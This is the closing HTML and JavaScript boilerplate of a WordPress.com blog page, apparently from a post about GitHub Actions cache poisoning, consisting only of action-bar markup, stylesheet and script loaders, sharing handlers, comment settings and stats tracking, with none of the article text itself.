									<svg class="gridicon gridicons-customize" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M2 6c0-1.505.78-3.08 2-4 0 .845.69 2 2 2 1.657 0 3 1.343 3 3 0 .386-.08.752-.212 1.09.74.594 1.476 1.19 2.19 1.81L8.9 11.98c-.62-.716-1.214-1.454-1.807-2.192C6.753 9.92 6.387 10 6 10c-2.21 0-4-1.79-4-4zm12.152 6.848l1.34-1.34c.607.304 1.283.492 2.008.492 2.485 0 4.5-2.015 4.5-4.5 0-.725-.188-1.4-.493-2.007L18 9l-2-2 3.507-3.507C18.9 3.188 18.225 3 17.5 3 15.015 3 13 5.015 13 7.5c0 .725.188 1.4.493 2.007L3 20l2 2 6.848-6.848c1.885 1.928 3.874 3.753 5.977 5.45l1.425 1.148 1.5-1.5-1.15-1.425c-1.695-2.103-3.52-4.092-5.448-5.977z"></path></g></svg>									<span>Edit Site</span>
								</a>
							</li>
																<li class="actnbr-folded-follow">
												<a class="actnbr-action actnbr-actn-follow " href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
										</li>
																	<li class="actnbr-signup"><a href="https://wordpress.com/start/">Sign up</a></li>
									<li class="actnbr-login"><a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fadnanthekhan.com%252F2024%252F05%252F06%252Fthe-monsters-in-your-build-cache-github-actions-cache-poisoning%252F">Log in</a></li>
																	<li class="actnbr-shortlink"><a href="https://wp.me/pfmzK7-7k">Copy shortlink</a></li>
																	<li class="flb-report">
										<a href="https://wordpress.com/abuse/?report_url=https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/" target="_blank" rel="noopener noreferrer">
											Report this content										</a>
									</li>
																	<li class="actnbr-reader">
										<a href="https://wordpress.com/read/blogs/227025655/posts/454">
											View post in Reader										</a>
									</li>
																	<li class="actnbr-subs">
										<a href="https://subscribe.wordpress.com/">Manage subscriptions</a>
									</li>
																		<li class="actnbr-fold"><a href="">Collapse this bar</a></li>
															</ul>
					</div>
				</div>
			</li>
		</ul>
	</div>
	
<script>
window.addEventListener( "load", function( event ) {
	var link = document.createElement( "link" );
	link.href = "https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.css?v=20240115";
	link.type = "text/css";
	link.rel = "stylesheet";
	document.head.appendChild( link );

	var script = document.createElement( "script" );
	script.src = "https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.js?v=20231122";
	script.defer = true;
	document.body.appendChild( script );
} );
</script>

	<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/_static/??-eJzTLy/QTc7PK0nNK9EvyClNz8wr1i+uzCtJrMjITM/IAeKS1CJMEWP94uSizIISoOIM5/yiVL2sYh19yo1yKiotzohMzM2hpnlewWA+NY0MqCzJyM+jqok5iZkgA+1zbQ3NDE1NzM0sjY2yACyroQk="></script>
<script type="text/javascript">
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://s0.wp.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?m=1363304414i&amp;ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	document.addEventListener( 'is.post-load', function () {
		SyntaxHighlighter.highlight();
	} );
</script>
<script id="jetpack-carousel-js-extra">
var jetpackSwiperLibraryPath = {"url":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/jetpack-plugin\/sun\/_inc\/build\/carousel\/swiper-bundle.min.js"};
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/adnanthekhan.com\/wp-admin\/admin-ajax.php","nonce":"7b23fab1c9","display_exif":"1","display_comments":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/adnanthekhancom.wordpress.com\/wp-login.php?redirect_to=https%3A%2F%2Fadnanthekhan.com%2F2024%2F05%2F06%2Fthe-monsters-in-your-build-cache-github-actions-cache-poisoning%2F","blog_id":"227025655","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"],"stats_query_args":"blog=227025655&v=wpcom&tz=-4&user_id=0&subd=adnanthekhancom","is_public":"1"};
</script>
<script id="comment-like-js-extra">
var comment_like_text = {"loading":"Loading...","swipeUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/comment-likes\/js\/lib\/swipe.js?ver=20131008"};
</script>
<script id="sharing-js-js-extra">
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
</script>
<script id="verbum-settings-js-before">
window.VerbumComments = {"Log in or provide your name and email to leave a reply.":"Log in or provide your name and email to leave a reply.","Log in or provide your name and email to leave a comment.":"Log in or provide your name and email to leave a comment.","Receive web and mobile notifications for posts on this site.":"Receive web and mobile notifications for posts on this site.","Name":"Name","Email (address never made public)":"Email (address never made public)","Website (optional)":"Website (optional)","Leave a reply. (log in optional)":"Leave a reply. (log in optional)","Leave a comment. (log in optional)":"Leave a comment. (log in optional)","Log in to leave a reply.":"Log in to leave a reply.","Log in to leave a comment.":"Log in to leave a comment.","Logged in via %s":"Logged in via %s","Log out":"Log out","Email":"Email","(Address never made public)":"(Address never made public)","Instantly":"Instantly","Daily":"Daily","Reply":"Reply","Comment":"Comment","WordPress":"WordPress","Weekly":"Weekly","Notify me of new posts":"Notify me of new posts","Email me new posts":"Email me new posts","Email me new comments":"Email me new comments","Cancel":"Cancel","Write a comment...":"Write a comment...","Write a reply...":"Write a reply...","Website":"Website","Optional":"Optional","We'll keep you in the loop!":"We'll keep you in the loop!","Loading your comment...":"Loading your comment...","Discover more from":"Discover more from Adnan Khan&#039;s Blog","Subscribe now to keep reading and get access to the full archive.":"Subscribe now to keep reading and get access to the full archive.","Continue reading":"Continue reading","Never miss a beat!":"Never miss a beat!","Interested in getting blog post updates? Simply click the button below to stay in the loop!":"Interested in getting blog post updates? Simply click the button below to stay in the loop!","Enter your email address":"Enter your email address","Subscribe":"Subscribe","Comment sent successfully":"Comment sent successfully","Save my name, email, and website in this browser for the next time I comment.":"Save my name, email, and website in this browser for the next time I comment.","siteId":227025655,"postId":454,"mustLogIn":false,"requireNameEmail":true,"commentRegistration":false,"connectURL":"https:\/\/adnanthekhancom.wordpress.com\/public.api\/connect\/?action=request&domain=adnanthekhan.com","logoutURL":"https:\/\/adnanthekhancom.wordpress.com\/wp-login.php?action=logout&_wpnonce=309a1c7404","homeURL":"https:\/\/adnanthekhan.com\/","subscribeToBlog":true,"subscribeToComment":true,"isJetpackCommentsLoggedIn":false,"jetpackUsername":"","jetpackUserId":0,"jetpackSignature":"","jetpackAvatar":"https:\/\/0.gravatar.com\/avatar\/?s=96&amp;d=identicon&amp;r=G","enableBlocks":true,"enableSubscriptionModal":true,"currentLocale":"en","isJetpackComments":false,"allowedBlocks":["core\/paragraph","core\/list","core\/code","core\/list-item","core\/quote","core\/image","core\/embed","core\/quote","core\/code"],"embedNonce":"df818c8892","verbumBundleUrl":"https:\/\/s0.wp.com\/wp-content\/mu-plugins\/jetpack-mu-wpcom-plugin\/sun\/vendor\/automattic\/jetpack-mu-wpcom\/src\/features\/verbum-comments\/dist\/index.js","isRTL":false,"vbeCacheBuster":1717067639}
</script>
<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/_static/??-eJydUe1uwyAMfKERp1qk/Jr2KJMLXgvhI8O4Vd5+qIVpX8qk/QIf5/P5gOuqdIqFYoEgavVyspHB24UY3oSEzhiNpzw4foDfyY7KinppNbBEeLFRw1GsN6AxJ2HyH7QODMHGHVVcLAcq6nEY73IdeM03sum99c2LqXYdg04hVB2VafXbHwO6nwpd19r42f+l6qcMKCUFLMXqH2zg3De8UD5KUG12dc5M9TBbxGC18gnNbn7d9D109w3Ya2xJNkdfy39/GJ8xk0FjttvVxlML8jk8HebDPI3TOE/uHaVM1js="></script>
<script id="wp-block-template-skip-link-js-after">
	( function() {
		var skipLinkTarget = document.querySelector( 'main' ),
			sibling,
			skipLinkTargetID,
			skipLink;

		// Early exit if a skip-link target can't be located.
		if ( ! skipLinkTarget ) {
			return;
		}

		/*
		 * Get the site wrapper.
		 * The skip-link will be injected in the beginning of it.
		 */
		sibling = document.querySelector( '.wp-site-blocks' );

		// Early exit if the root element was not found.
		if ( ! sibling ) {
			return;
		}

		// Get the skip-link target's ID, and generate one if it doesn't exist.
		skipLinkTargetID = skipLinkTarget.id;
		if ( ! skipLinkTargetID ) {
			skipLinkTargetID = 'wp--skip-link--target';
			skipLinkTarget.id = skipLinkTargetID;
		}

		// Create the skip link.
		skipLink = document.createElement( 'a' );
		skipLink.classList.add( 'skip-link', 'screen-reader-text' );
		skipLink.href = '#' + skipLinkTargetID;
		skipLink.innerHTML = 'Skip to content';

		// Inject the skip link.
		sibling.parentElement.insertBefore( skipLink, sibling );
	}() );
	
</script>
<script id="sharing-js-js-after">
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
</script>

	<script type="text/javascript">
		(function () {
			var wpcom_reblog = {
				source: 'toolbar',

				toggle_reblog_box_flair: function (obj_id, post_id) {

					// Go to site selector. This will redirect to their blog if they only have one.
					const postEndpoint = `https://wordpress.com/post`;

					// Ideally we would use the permalink here, but fortunately this will be replaced with the 
					// post permalink in the editor.
					const originalURL = `${ document.location.href }?page_id=${ post_id }`; 
					
					const url =
						postEndpoint +
						'?url=' +
						encodeURIComponent( originalURL ) +
						'&is_post_share=true' +
						'&v=5';

					const redirect = function () {
						if (
							! window.open( url, '_blank' )
						) {
							location.href = url;
						}
					};

					if ( /Firefox/.test( navigator.userAgent ) ) {
						setTimeout( redirect, 0 );
					} else {
						redirect();
					}
				},
			};

			window.wpcom_reblog = wpcom_reblog;
		})();
	</script>
<script type="text/javascript">
// <![CDATA[
(function() {
try{
  if ( window.external &&'msIsSiteMode' in window.external) {
    if (window.external.msIsSiteMode()) {
      var jl = document.createElement('script');
      jl.type='text/javascript';
      jl.async=true;
      jl.src='/wp-content/plugins/ie-sitemode/custom-jumplist.php';
      var s = document.getElementsByTagName('script')[0];
      s.parentNode.insertBefore(jl, s);
    }
  }
}catch(e){}
})();
// ]]>
</script>	<iframe src="https://widgets.wp.com/likes/master.html?ver=20240613#ver=20240613&amp;origin=https://adnanthekhan.com" scrolling="no" id="likes-master" name="likes-master" style="display:none;"></iframe>
	<div id="likes-other-gravatars" class="wpl-new-layout" role="dialog" aria-hidden="true" tabindex="-1">
		<div class="likes-text">
			<span>%d</span>		</div>
		<ul class="wpl-avatars sd-like-gravatars"></ul>
	</div>

		<script src="//stats.wp.com/w.js?67" defer=""></script> <script type="text/javascript">
_tkq = window._tkq || [];
_stq = window._stq || [];
_tkq.push(['storeContext', {'blog_id':'227025655','blog_tz':'-4','user_lang':'en','blog_lang':'en','user_id':'0'}]);
_stq.push(['view', {'blog':'227025655','v':'wpcom','tz':'-4','user_id':'0','post':'454','subd':'adnanthekhancom'}]);
		_stq.push(['extra', {'crypt':'UE40eW5QN0p8M2Y/RE1mNzc2NTVTamdsd0xoLz9RQkM2K298TXY9bERQMXc2MjhEaVZfb2wwakRoSj0mUkp1THptM1NdbkV1WjZIcU9mVWQmPUIvMlN6Jk8wW3NYVEJ3dWZOWExuWD8lbHN4UXkyK0JRaz9BNGhZclRjZjVfelNSRE1OMkRTazlpclVhU3U9cksmM05yZEkwU3g4LXp1UWxERD9KJUJbRGlrcGJIXWd0S21ZRUk5bUVCNFU0MTksY0c4bC12eDdbdCxnfitwLEVCYzJRY2ljN1RyRHVYQW5tTy9fVTgxYy1tSXxrck1xdlNdWHBaOWhsX0FJLSVuREpiN3AwOVJtVlhsR1VaRjcxZHNCbnlsSGguNjAvYktffFQyN3xyeUc='}]);
_stq.push([ 'clickTrackerInit', '227025655', '454' ]);
</script>
<noscript><img src="https://pixel.wp.com/b.gif?v=noscript" style="height:1px;width:1px;overflow:hidden;position:absolute;bottom:1px;" alt="" /></noscript>
<script>
if ( 'object' === typeof wpcom_mobile_user_agent_info ) {

	wpcom_mobile_user_agent_info.init();
	var mobileStatsQueryString = "";
	
	if( false !== wpcom_mobile_user_agent_info.matchedPlatformName )
		mobileStatsQueryString += "&x_" + 'mobile_platforms' + '=' + wpcom_mobile_user_agent_info.matchedPlatformName;
	
	if( false !== wpcom_mobile_user_agent_info.matchedUserAgentName )
		mobileStatsQueryString += "&x_" + 'mobile_devices' + '=' + wpcom_mobile_user_agent_info.matchedUserAgentName;
	
	if( wpcom_mobile_user_agent_info.isIPad() )
		mobileStatsQueryString += "&x_" + 'ipad_views' + '=' + 'views';

	if( "" != mobileStatsQueryString ) {
		new Image().src = document.location.protocol + '//pixel.wp.com/g.gif?v=wpcom-no-pv' + mobileStatsQueryString + '&baba=' + Math.random();
	}
	
}
</script>
<script type="disabled" id="wp-enqueue-dynamic-script:wp-i18n:after:1">
wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
</script>

<script>
(function() {
	'use strict';

	const fetches = {};
	const promises = {};
	const urls = {
		'wp-polyfill': 'https://s0.wp.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?m=1710866488i&ver=3.15.0',
		'wp-hooks': 'https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/hooks/index.min.js?m=1716578158i&ver=3aee234ea7807d8d70bc',
		'wp-i18n': 'https://s0.wp.com/wp-content/plugins/gutenberg-core/v18.4.1/build/i18n/index.min.js?m=1716578158i&ver=5baa98e4345eccc97e24',
		'verbum': 'https://s0.wp.com/wp-content/mu-plugins/jetpack-mu-wpcom-plugin/sun/vendor/automattic/jetpack-mu-wpcom/src/build/verbum-comments/verbum-comments.js?m=1718300862i&minify=false&ver=f722f8e738413ba13e41'
	};
	const loaders = {
		'verbum': () => {
			fetchExternalScript('wp-polyfill');
			fetchExternalScript('wp-hooks');
			fetchExternalScript('wp-i18n');
			fetchExternalScript('verbum');
			promises['wp-polyfill'] = promises['wp-polyfill'] || loadWPScript('wp-polyfill');
			promises['wp-hooks'] = promises['wp-hooks'] || promises['wp-polyfill'].then( () => loadWPScript('wp-hooks') );
			promises['wp-i18n'] = promises['wp-i18n'] || Promise.all( [ promises['wp-hooks'], promises['wp-polyfill'],  ] ).then( () => loadWPScript('wp-i18n') );
			promises['verbum'] = promises['verbum'] || promises['wp-i18n'].then( () => loadWPScript('verbum') );
			return promises['verbum'];
		},
		
	};
	const scriptExtras = {
		'wp-i18n': { translations: 0, before: 0, after: 1 },
		
	};

	window.WP_Enqueue_Dynamic_Script = {
		loadScript: (handle) => {
			if (!loaders[handle]) {
				console.error('WP_Enqueue_Dynamic_Script: unregistered script `' + handle + '`.');
			}
			return loaders[handle]();
		}
	};

	function fetchExternalScript(handle) {
		if (!urls[handle]) {
			return Promise.resolve();
		}

		fetches[handle] = fetches[handle] || fetch(urls[handle], { mode: 'no-cors' });
		return fetches[handle];
	}

	function runExtraScript(handle, type, index) {
		const id = 'wp-enqueue-dynamic-script:' + handle + ':' + type + ':' + (index + 1);
		const template = document.getElementById(id);
		if (!template) {
			return Promise.reject();
		}

		const script = document.createElement( 'script' );
		script.innerHTML = template.innerHTML;
		document.body.appendChild( script );
		return Promise.resolve();
	}

	function loadExternalScript(handle) {
		if (!urls[handle]) {
			return Promise.resolve();
		}

		return fetches[handle].then(() => {
			return new Promise((resolve, reject) => {
				const script = document.createElement('script');
				script.onload = () => resolve();
				script.onerror = (e) => reject(e);
				script.src = urls[handle];
				document.body.appendChild(script);
			});
		});
	}

	function loadExtra(handle, pos) {
		const count = (scriptExtras[handle] && scriptExtras[handle][pos]) || 0;
		let promise = Promise.resolve();

		for (let i = 0; i < count; i++) {
			promise = promise.then(() => runExtraScript(handle, pos, i));
		}

		return promise;
	}

	function loadWPScript(handle) {
		// Core loads scripts in this order. See: https://github.com/WordPress/WordPress/blob/a59eb9d39c4fcba834b70c9e8dfd64feeec10ba6/wp-includes/class-wp-scripts.php#L428.
		return loadExtra(handle, 'translations')
			.then(() => loadExtra(handle, 'before'))
			.then(() => loadExternalScript(handle))
			.then(() => loadExtra(handle, 'after'));
	}
} )();
</script>


<div class="comment-likes-overlay" style="display: none;"></div><iframe style="display: none;" scrolling="no" id="wpcom_remote_login_key" src="https://r-login.wordpress.com/remote-login.php?wpcom_remote_login=key&amp;origin=aHR0cHM6Ly9hZG5hbnRoZWtoYW4uY29t&amp;wpcomid=227025655&amp;time=1718319792"></iframe><script src="https://s0.wp.com/wp-content/mu-plugins/actionbar/actionbar.js?v=20231122" defer=""></script></body></html>